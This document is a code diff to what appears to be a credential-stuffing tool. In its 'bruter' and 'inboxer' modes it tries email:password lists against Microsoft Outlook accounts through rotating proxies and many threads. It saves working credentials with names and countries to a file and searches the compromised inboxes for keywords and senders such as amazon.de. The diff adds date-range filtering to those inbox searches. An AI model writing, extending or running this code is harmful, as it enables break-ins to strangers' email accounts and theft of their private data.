@@ -679,7 +679,8 @@ _OUTLOOK_STATE: Dict[str, Any] = {
     "running": False, "done": False, "total": 0,
     "hits": 0, "bad": 0, "found": 0, "retries": 0,
     "results": [], "error": "", "mode": "bruter",
-    "keyword": "", "sender": "", "started_at": None, "finished_at": None,
+    "keyword": "", "sender": "", "date_from": "", "date_to": "",
+    "started_at": None, "finished_at": None,
 }
 _OUTLOOK_LOCK = threading.Lock()
 _OUTLOOK_STOP = threading.Event()
@@ -690,16 +691,20 @@ class OutlookBody(BaseModel):
     mode: str = Field("bruter", pattern="^(bruter|inboxer)$")
     keyword: Optional[str] = None
     sender: Optional[str] = None
+    date_from: Optional[str] = None
+    date_to: Optional[str] = None
     proxy_file: Optional[str] = None
     workers: Optional[int] = None
 
 
-def _outlook_reset(total: int, mode: str, keyword: str, sender: str = "") -> None:
+def _outlook_reset(total: int, mode: str, keyword: str, sender: str = "",
+                   date_from: str = "", date_to: str = "") -> None:
     with _OUTLOOK_LOCK:
         _OUTLOOK_STATE.update(
             running=True, done=False, total=total,
             hits=0, bad=0, found=0, retries=0,
             results=[], error="", mode=mode, keyword=keyword, sender=sender,
+            date_from=date_from, date_to=date_to,
             started_at=time.time(), finished_at=None,
         )
         _OUTLOOK_STOP.clear()
@@ -861,9 +866,11 @@ def _msft_get_profile(session, substrate_token: str, email: str,
 
 def _msft_search_inbox(session, refresh_token: str, email: str,
                         keyword: str, timeout: int = 30,
-                        sender: str = "") -> int:
-    """Search inbox for keyword (+ optional from: filter), return match count."""
-    # Build query string: combine sender filter with keyword
+                        sender: str = "",
+                        date_from: str = "",
+                        date_to: str = "") -> int:
+    """Search inbox for keyword (+ optional from:/date filters), return match count."""
+    # Build query string: combine sender filter + date range + keyword (KQL)
     parts = []
     if sender:
         # Support multiple senders comma-separated: "amazon.de,audible.de"
@@ -873,6 +880,13 @@ def _msft_search_inbox(session, refresh_token: str, email: str,
         elif senders:
             from_clause = " OR ".join(f"from:{s}" for s in senders)
             parts.append(f"({from_clause})")
+    # KQL date range: received:start..end (Exchange accepts M/D/YYYY and ISO)
+    if date_from and date_to:
+        parts.append(f"received:{date_from}..{date_to}")
+    elif date_from:
+        parts.append(f"received:>={date_from}")
+    elif date_to:
+        parts.append(f"received:<={date_to}")
     if keyword:
         parts.append(keyword)
     query_string = " ".join(parts) if parts else "*"
@@ -936,7 +950,8 @@ def _msft_search_inbox(session, refresh_token: str, email: str,
 
 
 def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
-                          mode: str, keyword: str, sender: str = "") -> None:
+                          mode: str, keyword: str, sender: str = "",
+                          date_from: str = "", date_to: str = "") -> None:
     """Run one account: brute + optional inbox search. Updates _OUTLOOK_STATE."""
     import requests as _rq
     session = _rq.Session()
@@ -991,11 +1006,13 @@ def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
             )
 
             found_count = 0
-            if mode == "inboxer" and (keyword or sender):
-                found_count = _msft_search_inbox(session, tokens["refresh_token"],
-                                                  email, keyword, sender=sender)
+            if mode == "inboxer" and (keyword or sender or date_from or date_to):
+                found_count = _msft_search_inbox(
+                    session, tokens["refresh_token"], email, keyword,
+                    sender=sender, date_from=date_from, date_to=date_to,
+                )
                 if found_count > 0:
-                    _append_log(f"[+] outlook INBOX HIT: {email} | Found: {found_count} | q={keyword} from={sender}")
+                    _append_log(f"[+] outlook INBOX HIT: {email} | Found: {found_count} | q={keyword} from={sender} {date_from}..{date_to}")
                     with open(_OUTLOOK_RESULTS_FILE.parent / "outlook_inbox.txt", "a", encoding="utf-8") as fh:
                         fh.write(f"{email}:{password} | Name: {name} | Country: {country} | Found: {found_count}\n")
 
@@ -1016,7 +1033,8 @@ def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
 
 
 def _run_outlook(accounts: List[Tuple[str, str]], mode: str, keyword: str,
-                  sender: str, proxy_file: Optional[str], workers: int) -> None:
+                  sender: str, proxy_file: Optional[str], workers: int,
+                  date_from: str = "", date_to: str = "") -> None:
     """Batch runner. Runs in a background thread."""
     # Build proxy pool (round-robin)
     proxies: List[str] = []
@@ -1077,7 +1095,8 @@ def _run_outlook(accounts: List[Tuple[str, str]], mode: str, keyword: str,
     def _do_one(acc: Tuple[str, str]) -> None:
         em, pw = acc
         proxy = _get_proxy()
-        _run_outlook_account(em, pw, proxy, mode, keyword or "", sender or "")
+        _run_outlook_account(em, pw, proxy, mode, keyword or "", sender or "",
+                             date_from or "", date_to or "")
         with lock:
             done[0] += 1
             pct = done[0] / total * 100
@@ -1130,11 +1149,29 @@ async def api_outlook_start(
         raise HTTPException(status_code=400, detail="no valid email:password lines")
     workers = body.workers or (15 if body.mode == "inboxer" else 100)
     workers = min(max(workers, 1), 150)
-    _outlook_reset(len(accounts), body.mode, body.keyword or "", body.sender or "")
+    date_from = (body.date_from or "").strip()
+    date_to = (body.date_to or "").strip()
+    # normalize: accept both dd.mm.yyyy and yyyy-mm-dd -> Exchange M/D/YYYY KQL
+    def _norm_date(v: str) -> str:
+        if not v:
+            return ""
+        v = v.strip()
+        if re.match(r"^\d{4}-\d{2}-\d{2}$", v):
+            y, m, d = v.split("-")
+            return f"{int(m)}/{int(d)}/{y}"
+        if re.match(r"^\d{1,2}/\d{1,2}/\d{4}$", v):
+            m, d, y = v.split("/")
+            return f"{int(m)}/{int(d)}/{y}"
+        if re.match(r"^\d{1,2}\.\d{1,2}\.\d{4}$", v):
+            d, m, y = v.split(".")
+            return f"{int(m)}/{int(d)}/{y}"
+        return ""  # invalid -> ignored
+    df, dt = _norm_date(date_from), _norm_date(date_to)
+    _outlook_reset(len(accounts), body.mode, body.keyword or "", body.sender or "", df, dt)
     threading.Thread(
         target=_run_outlook,
         args=(accounts, body.mode, body.keyword or "", body.sender or "",
-              body.proxy_file, workers),
+              body.proxy_file, workers, df, dt),
         daemon=True,
     ).start()
     return {"ok": True, "started": True, "total": len(accounts)}
